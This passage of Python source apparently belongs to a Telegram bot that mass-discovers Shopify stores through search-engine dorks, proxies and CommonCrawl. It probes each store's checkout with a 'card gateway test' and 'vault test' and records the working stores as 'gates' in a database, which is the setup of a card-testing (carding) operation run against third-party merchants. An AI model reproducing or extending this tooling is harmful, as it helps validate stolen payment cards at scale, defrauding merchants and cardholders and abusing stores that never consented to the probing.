            await wait.edit_text(f"❌ Failed: `{e}`")
            return
        finally:
            if tmp_path and os.path.exists(tmp_path):
                os.remove(tmp_path)
        
        for line in lines:
            for word in line.split():
                word = word.strip()
                if not word:
                    continue
                if word.startswith("http://") or word.startswith("https://"):
                    urls.append(word)
                elif "." in word and len(word) > 4:
                    urls.append("https://" + word)
    else:
        text = message.text.strip()
        cmd = text.split()[0]
        lines = text[len(cmd):].strip().split()
        if not lines:
            await message.reply(
                "❌ **Usage:**\n"
                "Reply to a `.txt` file with `/massaddshopify` caption, OR send list of URLs:\n"
                "`/massaddshopify https://site1.com https://site2.com`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return
        for word in lines:
            word = word.strip()
            if not word:
                continue
            if word.startswith("http://") or word.startswith("https://"):
                urls.append(word)
            elif "." in word and len(word) > 4:
                urls.append("https://" + word)

    urls = list(dict.fromkeys(urls))
    # Filter junk domains before scanning
    urls = [u for u in urls if not _is_junk_url(u)]
    if not urls:
        if doc_msg:
            await wait.edit_text("❌ No Shopify URLs found in file.")
        else:
            await message.reply("❌ No valid URLs found.")
        return

    total = len(urls)
    # Workers: 15 concurrent — high enough for speed, low enough to avoid IP bans
    WORKERS = min(15, total)

    status_msg = wait if doc_msg else await message.reply(
        f"🔍 **Mass Shopify Scan Started!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 **Total Sites:** `{total}`\n"
        f"⚙️ **Workers:** `{WORKERS}` (parallel)\n"
        f"🃏 **Validation:** Full card gateway test\n"
        f"⏳ Please wait...",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    working_count = 0
    failed_count  = 0
    working_list  = []

    sem  = asyncio.Semaphore(WORKERS)
    lock = asyncio.Lock()
    last_edit = 0.0

    async def scan_one(url: str):
        nonlocal working_count, failed_count, last_edit
        async with sem:
            res = await _scan_shopify_site(url)
            async with lock:
                if res["status"] == "WORKING":
                    working_count += 1
                    gate_id = await db.add_shopify_gate(
                        base_url=res["url"],
                        variant_id=res["variant_id"],
                        price=res["price"],
                        product_title=res["product_title"],
                        shop_domain=res["shop_domain"],
                        shop_id=res["shop_id"],
                        currency=res["currency"],
                        checkout_type=res["checkout_type"],
                        added_by=message.from_user.id,
                        scan_data=res.get("scan_data", {}),
                    )
                    # Also refresh the in-memory store cache so new stores are used immediately
                    try:
                        from gateways.shopify_gate import invalidate_stores_cache
                        invalidate_stores_cache()
                    except Exception:
                        pass
                    sd = res.get("scan_data", {})
                    test_info = sd.get("card_test", "")
                    working_list.append(f"#{gate_id} | {res['url']} (${res['price']}) | ✅ {test_info[:30]}")
                else:
                    failed_count += 1

                done = working_count + failed_count
                now  = time.monotonic()
                # Update progress every 2 sites or every 2 seconds
                if done % 2 == 0 or done == total or (now - last_edit >= 2.0):
                    if now - last_edit >= 1.5 or done == total:
                        last_edit = now
                        progress_text = (
                            f"🔍 **Scanning Shopify Sites...**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"⏳ **Progress:** `{done}/{total}`\n"
                            f"✅ **Working (verified):** `{working_count}`\n"
                            f"❌ **Failed/Invalid:** `{failed_count}`"
                        )
                        try:
                            await status_msg.edit_text(progress_text, parse_mode=enums.ParseMode.MARKDOWN)
                        except Exception:
                            pass

    await asyncio.gather(*[scan_one(url) for url in urls])
    
    working_results = "\n".join(working_list) if working_list else "None"
    final_text = (
        f"✅ **Mass Shopify Scan Complete!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Summary:**\n"
        f"📋 Total: `{total}`\n"
        f"✅ Working: `{working_count}`\n"
        f"❌ Failed: `{failed_count}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛍️ **Added Gates:**\n"
        f"`{working_results}`"
    )
    await status_msg.edit_text(final_text, parse_mode=enums.ParseMode.MARKDOWN)


# ── /shopscan (auto-discover Shopify sites via dorks) ─────────────────────────
async def cmd_shopscan(client: Client, message):
    if not _is_owner(message.from_user.id):
        await message.reply("❌ Owner only command.")
        return

    parts = message.text.strip().split()
    try:
        count = int(parts[1]) if len(parts) > 1 else 100
        count = max(10, min(500, count))
    except (ValueError, IndexError):
        count = 100

    status_msg = await message.reply(
        f"🔍 **Shopify Auto-Discover Started!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target:** Find `{count}` Shopify sites\n"
        f"🌐 **Engines:** Google + Bing + Yahoo + DDG + Yandex\n"
        f"🔑 **Dorks:** Shopify-specific patterns\n"
        f"⏳ Discovering sites... please wait.",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    # Get a proxy
    from core.proxy_manager import get_next_proxy
    proxy = get_next_proxy()
    if not proxy:
        await status_msg.edit_text("❌ No proxies available. Add proxies first with `/addproxy`.")
        return

    # ── Load already-known URLs BEFORE discovery (pass to fetcher) ────────────
    _SCANNED_HISTORY_FILE = os.path.join(os.path.dirname(__file__), "..", "ccshopscan_history.txt")
    _SCANNED_HISTORY_FILE = os.path.normpath(_SCANNED_HISTORY_FILE)

    scanned_before: set = set()
    try:
        if os.path.exists(_SCANNED_HISTORY_FILE):
            with open(_SCANNED_HISTORY_FILE, "r", encoding="utf-8") as _hf:
                scanned_before = {l.strip().rstrip("/").lower() for l in _hf if l.strip()}
    except Exception:
        pass

    existing_db_urls: set = set()
    try:
        gates = await db.get_all_shopify_gates()
        for g in gates:
            u = (g.get("base_url") or "").rstrip("/").lower()
            if u:
                existing_db_urls.add(u)
    except Exception:
        pass

    already_known = scanned_before | existing_db_urls

    # ── Step 1: Discover URLs via search engines (excluding known) ────────────
    discovered = []
    last_edit = [time.monotonic()]

    async def discover_progress(found, target):
        nonlocal last_edit
        now = time.monotonic()
        if now - last_edit[0] >= 2.0:
            last_edit[0] = now
            try:
                await status_msg.edit_text(
                    f"🔍 **Shopify Discovery — Searching...**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌐 **New URLs Found:** `{found}`\n"
                    f"🎯 **Target:** `{target}`\n"
                    f"♻️ **Skipping:** {len(already_known)} already known\n"
                    f"⏳ Running 5 search engines in parallel...",
                    parse_mode=enums.ParseMode.MARKDOWN,
                )
            except Exception:
                pass

    try:
        from core.auto_discover import discover_shopify_sites
        discovered = await discover_shopify_sites(
            count=count,
            proxy=proxy,
            progress_cb=discover_progress,
            exclude=already_known,
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Discovery error: `{e}`")
        return

    if not discovered:
        await status_msg.edit_text(
            f"❌ **No new Shopify sites found!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"♻️ Skipped {len(already_known)} already-known sites\n"
            f"💡 Try `/shopscan {count * 2}` for more variety."
        )
        return

    total_found = len(discovered)
    skipped = len(already_known)

    await status_msg.edit_text(
        f"✅ **Discovery Done!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆕 **New sites found:** `{total_found}`\n"
        f"♻️ **Already known (skipped at fetch):** `{skipped}`\n"
        f"🔬 **Now testing each site...** (gateway + vault test)\n"
        f"⚙️ **Workers:** `15` parallel\n"
        f"⏳ This may take a few minutes...",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    # ── Step 2: Scan each discovered URL ──────────────────────────────────────
    WORKERS = min(15, len(discovered))
    working_count = 0
    failed_count  = 0
    working_list  = []
    done          = 0
    all_scanned_now: list = list(discovered)


    sem  = asyncio.Semaphore(WORKERS)
    lock = asyncio.Lock()
    last_edit2 = [time.monotonic()]

    async def scan_one(url: str):
        nonlocal working_count, failed_count, done
        async with sem:
            res = await _scan_shopify_site(url)
            async with lock:
                done += 1
                if res["status"] == "WORKING":
                    working_count += 1
                    gate_id = await db.add_shopify_gate(
                        base_url=res["url"],
                        variant_id=res["variant_id"],
                        price=res["price"],
                        product_title=res["product_title"],
                        shop_domain=res["shop_domain"],
                        shop_id=res["shop_id"],
                        currency=res["currency"],
                        checkout_type=res["checkout_type"],
                        added_by=message.from_user.id,
                        scan_data=res.get("scan_data", {}),
                    )
                    try:
                        from gateways.shopify_gate import invalidate_stores_cache
                        invalidate_stores_cache()
                    except Exception:
                        pass
                    working_list.append(f"#{gate_id} | {res['url']} (${res['price']})")
                else:
                    failed_count += 1

                # Update progress every 5 sites or 3 seconds
                now = time.monotonic()
                if done % 5 == 0 or done == total_found or (now - last_edit2[0] >= 3.0):
                    if now - last_edit2[0] >= 2.0 or done == total_found:
                        last_edit2[0] = now
                        pct = int((done / total_found) * 100)
                        filled = int(pct / 10)
                        bar = "█" * filled + "░" * (10 - filled)
                        try:
                            await status_msg.edit_text(
                                f"🔬 **Testing Shopify Sites...**\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"[{bar}] `{pct}%`\n"
                                f"⏳ **Progress:** `{done}/{total_found}`\n"
                                f"✅ **Working (added):** `{working_count}`\n"
                                f"❌ **Failed/Invalid:** `{failed_count}`",
                                parse_mode=enums.ParseMode.MARKDOWN,
                            )
                        except Exception:
                            pass

    await asyncio.gather(*[scan_one(url) for url in discovered])

    # ── Final report ──────────────────────────────────────────────────────────
    working_results = "\n".join(working_list[:30]) if working_list else "None"
    if len(working_list) > 30:
        working_results += f"\n... and {len(working_list) - 30} more"

    # ── Save scanned URLs to history (so next run skips them) ─────────────────
    try:
        with open(_SCANNED_HISTORY_FILE, "a", encoding="utf-8") as _hf:
            for _u in all_scanned_now:
                _hf.write(_u.rstrip("/").lower() + "\n")
    except Exception:
        pass

    final_text = (
        f"🛍️ **Shopify Auto-Scan Complete!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Results:**\n"
        f"🌐 Sites Discovered: `{total_found}`\n"
        f"♻️ Already Known (skipped): `{skipped}`\n"
        f"🆕 New Sites Tested: `{len(discovered)}`\n"
        f"✅ Working Gates Added: `{working_count}`\n"
        f"❌ Failed/Invalid: `{failed_count}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛍️ **Added Gates:**\n"
        f"`{working_results}`"
    )
    await status_msg.edit_text(final_text, parse_mode=enums.ParseMode.MARKDOWN)



# ── /ccshopscan (CommonCrawl → scan → DB save) ────────────────────────────────
async def cmd_ccshopscan(client: Client, message):
    """
    Discover Shopify stores via CommonCrawl CDX API (FREE, no proxy needed),
    scan each with _scan_shopify_site(), save only WORKING gates to DB.
    Usage: /ccshopscan [count]  (default 2000, max 10000)
    """
    if not _is_owner(message.from_user.id):
        await message.reply("❌ Owner only command.")
        return

    parts = message.text.strip().split()
    try:
        count = int(parts[1]) if len(parts) > 1 else 2000
        count = max(50, min(10000, count))
    except (ValueError, IndexError):
        count = 2000

    status_msg = await message.reply(
        f"🌐 **CommonCrawl Shopify Scanner Started!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target URLs:** `{count}`\n"
        f"📡 **Source:** CommonCrawl CDX API (FREE)\n"
        f"🔑 **Auth:** None needed\n"
        f"🔌 **Proxy:** Not required\n"
        f"📦 **10 CC Indexes** (2022–2025 crawl data)\n"
        f"⏳ Fetching from CommonCrawl...",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    # ── Load already-known URLs BEFORE discovery (pass to fetcher) ────────────
    _SCANNED_HISTORY_FILE = os.path.join(os.path.dirname(__file__), "..", "ccshopscan_history.txt")
    _SCANNED_HISTORY_FILE = os.path.normpath(_SCANNED_HISTORY_FILE)

    scanned_before: set = set()
    try:
        if os.path.exists(_SCANNED_HISTORY_FILE):
            with open(_SCANNED_HISTORY_FILE, "r", encoding="utf-8") as _hf:
                scanned_before = {l.strip().rstrip("/").lower() for l in _hf if l.strip()}
    except Exception:
        pass

    existing_db_urls: set = set()
    try:
        gates = await db.get_all_shopify_gates()
        for g in gates:
            u = (g.get("base_url") or "").rstrip("/").lower()
            if u:
                existing_db_urls.add(u)
    except Exception:
        pass

    already_known = scanned_before | existing_db_urls

    # ── Step 1: Discover via CommonCrawl (excluding known URLs at fetch) ───────
    discovered = []
    last_edit  = [time.monotonic()]

    async def cc_progress(found, target):
        now = time.monotonic()
        if now - last_edit[0] >= 2.5:
            last_edit[0] = now
            try:
                pct    = min(100, int(found / max(target, 1) * 100))
                filled = int(pct / 10)
                bar    = "█" * filled + "░" * (10 - filled)
                await status_msg.edit_text(
                    f"📡 **CommonCrawl Fetching...**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"[{bar}] `{pct}%`\n"
                    f"🌐 **New URLs Found:** `{found}/{target}`\n"
                    f"♻️ **Skipping:** {len(already_known)} already known\n"
                    f"⏳ Scanning multiple CC indexes...",
                    parse_mode=enums.ParseMode.MARKDOWN,
                )
            except Exception:
                pass

    # ── Try CommonCrawl first, fall back to dork-search if CC is unreachable ─────
    cc_ok = False
    discovered = []
    try:
        from core.auto_discover import discover_shopify_via_commoncrawl
        discovered = await discover_shopify_via_commoncrawl(
            count=count,
            progress_cb=cc_progress,
            exclude=already_known,
        )
        cc_ok = bool(discovered)
    except Exception as e:
        logger.warning(f"CommonCrawl failed: {e}")

    # ── Fallback: dork-based discovery via search engines ─────────────────────
    if not discovered:
        await status_msg.edit_text(
            f"⚠️ **CommonCrawl unavailable (API timeout/rate-limit)**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Switching to **Search Engine Dorks** (Google+Bing+DDG)...\n"
            f"🔑 Requires proxy — checking...",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        from core.proxy_manager import get_next_proxy
        proxy = get_next_proxy()
        if not proxy:
            await status_msg.edit_text(
                f"❌ **CommonCrawl down + No proxy available**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"CC API is currently unreachable AND no proxies in DB.\n"
                f"📌 Add proxies with `/addproxy` then try again.\n"
                f"📌 Or wait for CC API to recover and retry later."
            )
            return

        async def dork_progress(found, target):
            now = time.monotonic()
            if now - last_edit[0] >= 2.5:
                last_edit[0] = now
                try:
                    pct    = min(100, int(found / max(target, 1) * 100))
                    filled = int(pct / 10)
                    bar    = "█" * filled + "░" * (10 - filled)
                    await status_msg.edit_text(
                        f"🔍 **Dork Discovery (CC fallback)...**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[{bar}] `{pct}%`\n"
                        f"🌐 **New URLs Found:** `{found}/{target}`\n"
                        f"⏳ Searching Google + Bing + DDG...",
                        parse_mode=enums.ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

        try:
            from core.auto_discover import discover_shopify_sites
            discovered = await discover_shopify_sites(
                count=count,
                proxy=proxy,
                progress_cb=dork_progress,
                exclude=already_known,
            )
        except Exception as e:
            await status_msg.edit_text(f"❌ Fallback dork discovery also failed: `{e}`")
            return

    if not discovered:
        await status_msg.edit_text(
            f"❌ **No new Shopify sites found!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ CC API unreachable + dork search found 0 new sites\n"
            f"♻️ Already known: {len(already_known)} sites\n"
            f"💡 Try `/ccshopscan {count * 2}` later."
        )
        return

    total_found = len(discovered)
    skipped     = len(already_known)
    all_scanned_now: list = list(discovered)

    await status_msg.edit_text(
        f"✅ **CommonCrawl Done!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆕 **New URLs fetched:** `{total_found}`\n"
        f"♻️ **Already known (skipped at fetch):** `{skipped}`\n"
        f"🔬 **Now testing each...** (gateway + vault check)\n"
        f"⚙️ **Workers:** `30` parallel\n"
        f"⏳ This may take a few minutes...",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    # ── Step 2: Scan each URL with _scan_shopify_site ─────────────────────────
    working_count = 0
    failed_count  = 0
    working_list  = []
    done          = 0

    sem        = asyncio.Semaphore(30)   # increased from 15 → 30 for 2× speed
    lock       = asyncio.Lock()
    last_edit2 = [time.monotonic()]

    # Collect full results for txt report
    all_results: list[dict] = []


    async def scan_one(url: str):
        nonlocal working_count, failed_count, done
        async with sem:
            res = await _scan_shopify_site(url)
            async with lock:
                done += 1
                sd = res.get("scan_data", {})

                if res["status"] == "WORKING":
                    working_count += 1
                    gate_id = await db.add_shopify_gate(
                        base_url=res["url"],
                        variant_id=res["variant_id"],
                        price=res["price"],
                        product_title=res["product_title"],
                        shop_domain=res["shop_domain"],
                        shop_id=res["shop_id"],
                        currency=res["currency"],
                        checkout_type=res["checkout_type"],
                        added_by=message.from_user.id,
                        scan_data=sd,
                    )
                    try:
                        from gateways.shopify_gate import invalidate_stores_cache
                        invalidate_stores_cache()
                    except Exception:
                        pass
                    working_list.append(
                        f"#{gate_id} | {res['url']} "
                        f"(${res['price']}) | {res['checkout_type']}"
                    )
                    all_results.append({
                        "status":   "WORKING",
                        "gate_id":  gate_id,
                        "url":      res["url"],
                        "price":    res["price"],
                        "currency": res["currency"],
                        "product":  res["product_title"],
                        "checkout": res["checkout_type"],
                        "shop_domain":     res["shop_domain"],
                        "vault_status":    sd.get("vault_status", ""),
                        "vault_response":  sd.get("vault_response", ""),
                        "card_test":       sd.get("card_test", ""),
                        "delivery_handle": sd.get("delivery_handle", ""),
                        "checkout_url":    sd.get("checkout_url", ""),
                        "reason":          res["reason"],
                    })
                else:
                    failed_count += 1
                    all_results.append({
                        "status":  "FAILED",
                        "url":     res["url"],
                        "reason":  res["reason"],
                        "vault_status":   sd.get("vault_status", ""),
                        "vault_response": sd.get("vault_response", ""),
                        "card_test":      sd.get("card_test", ""),
                    })

                now = time.monotonic()
                if now - last_edit2[0] >= 2.5 or done == total_found:
                    last_edit2[0] = now
                    pct    = int((done / total_found) * 100)
                    filled = int(pct / 10)
                    bar    = "█" * filled + "░" * (10 - filled)
                    try:
                        await status_msg.edit_text(
                            f"🔬 **Scanning Shopify Sites...**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"[{bar}] `{pct}%`\n"
                            f"⏳ **Progress:** `{done}/{total_found}`\n"
                            f"✅ **Working (saved):** `{working_count}`\n"
                            f"❌ **Failed/No Gateway:** `{failed_count}`",
                            parse_mode=enums.ParseMode.MARKDOWN,
                        )
                    except Exception:
                        pass

    await asyncio.gather(*[scan_one(url) for url in discovered])

    # ── Save scanned URLs to history (so next run skips them) ─────────────────
    try:
        with open(_SCANNED_HISTORY_FILE, "a", encoding="utf-8") as _hf:
            for _u in all_scanned_now:
                _hf.write(_u.rstrip("/").lower() + "\n")
    except Exception:
        pass

    # ── Build detailed txt report ──────────────────────────────────────────────
    import tempfile
    from datetime import datetime

    report_lines = [
        "=" * 70,
        f"CCSHOPSCAN REPORT — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Source: CommonCrawl CDX API (FREE)",
        f"Total Fetched: {total_found} | Already Known (skipped): {skipped} | New Tested: {len(discovered)}",
        f"Working: {working_count} | Failed: {failed_count}",
        "=" * 70,
        "",
        "━" * 70,
        f"✅ WORKING GATES ({working_count})",
        "━" * 70,
    ]

    for r in all_results:
        if r["status"] != "WORKING":
            continue
        report_lines += [
            f"",
            f"🛍 URL       : {r['url']}",
            f"🆔 Gate ID   : #{r['gate_id']}",
            f"💰 Price     : ${r['price']} {r['currency']}",
            f"📦 Product   : {r['product']}",
            f"🏪 Shop      : {r['shop_domain']}",
            f"🔧 Checkout  : {r['checkout']}",
            f"🔗 CO URL    : {r['checkout_url']}",
            f"🔒 Vault     : {r['vault_status']} | {r['vault_response'][:80]}",
            f"💳 Card Test : {r['card_test']}",
            f"🚚 Delivery  : {r['delivery_handle'][:60] if r['delivery_handle'] else 'N/A'}",
            f"ℹ️  Reason    : {r['reason']}",
            "-" * 60,
        ]

    report_lines += [
        "",
        "━" * 70,
        f"❌ FAILED SITES ({failed_count})",
        "━" * 70,
    ]

    for r in all_results:
        if r["status"] != "FAILED":
            continue
        vault_info = ""
        if r.get("vault_status"):
            vault_info = f" | Vault: {r['vault_status']} {r.get('vault_response','')[:40]}"
        card_info = f" | Card: {r['card_test']}" if r.get("card_test") and r["card_test"] != "pending" else ""
        report_lines.append(
            f"✗ {r['url']}  →  {r['reason']}{vault_info}{card_info}"
        )

    report_lines += [
        "",
        "=" * 70,
        f"END OF REPORT — {working_count}/{total_found} working",
        "=" * 70,
    ]

    report_text = "\n".join(report_lines)

    # ── Save scanned URLs to history so they're skipped next run ────────────
    try:
        with open(_SCANNED_HISTORY_FILE, "a", encoding="utf-8") as _hf:
            _hf.write("\n".join(all_scanned_now) + "\n")
        logger.info(f"History file updated: +{len(all_scanned_now)} URLs → {_SCANNED_HISTORY_FILE}")
    except Exception as _he:
        logger.warning(f"Failed to save scan history: {_he}")

    # Save and send txt file
    try:
        tmp_path = os.path.join(tempfile.gettempdir(), f"ccshopscan_{int(time.time())}.txt")
        with open(tmp_path, "w", encoding="utf-8") as f:
            f.write(report_text)

        await status_msg.edit_text(
            f"🛍️ **CommonCrawl Scan Complete!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 **Source:** CommonCrawl CDX (FREE)\n"
            f"🌐 **Scanned:** `{total_found}`\n"
            f"✅ **Working Gates Added:** `{working_count}`\n"
            f"❌ **Failed:** `{failed_count}`\n"
            f"📄 **Sending full report...**",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        caption = (
            f"📊 **CCShopScan Report**\n"
            f"✅ Working: `{working_count}` | ❌ Failed: `{failed_count}`\n"
            f"🌐 Total: `{total_found}` | 📅 {datetime.now().strftime('%d %b %Y %H:%M')}"
        )
        await client.send_document(
            chat_id=message.chat.id,
            document=tmp_path,
            caption=caption,
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        os.unlink(tmp_path)

    except Exception as e:
        # Fallback: send short text summary
        results_preview = "\n".join(working_list[:20]) if working_list else "None"
        await status_msg.edit_text(
            f"🛍️ **CommonCrawl Scan Complete!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Working: `{working_count}` | ❌ Failed: `{failed_count}`\n"
            f"⚠️ Report file error: `{str(e)[:60]}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"`{results_preview}`",
            parse_mode=enums.ParseMode.MARKDOWN,
        )




# ── Register ───────────────────────────────────────────────────────────────────
def register_shopify_handler(app: Client):
    app.on_message(filters.command("addshopify"))(notify_owner_on_error(cmd_add_shopify))
    app.on_message(filters.command("scshopify"))(notify_owner_on_error(cmd_scan_shopify))
    app.on_message(filters.command("shopifygates"))(notify_owner_on_error(cmd_shopify_gates))
    app.on_message(filters.command("rmshopify"))(notify_owner_on_error(cmd_rm_shopify))
    app.on_message(filters.command("massaddshopify") | filters.command("addmassshopify"))(notify_owner_on_error(cmd_mass_add_shopify))
    app.on_message(filters.command("shopscan"))(notify_owner_on_error(cmd_shopscan))
    app.on_message(filters.command("ccshopscan"))(notify_owner_on_error(cmd_ccshopscan))
    logger.info("✅ Shopify handler registered")

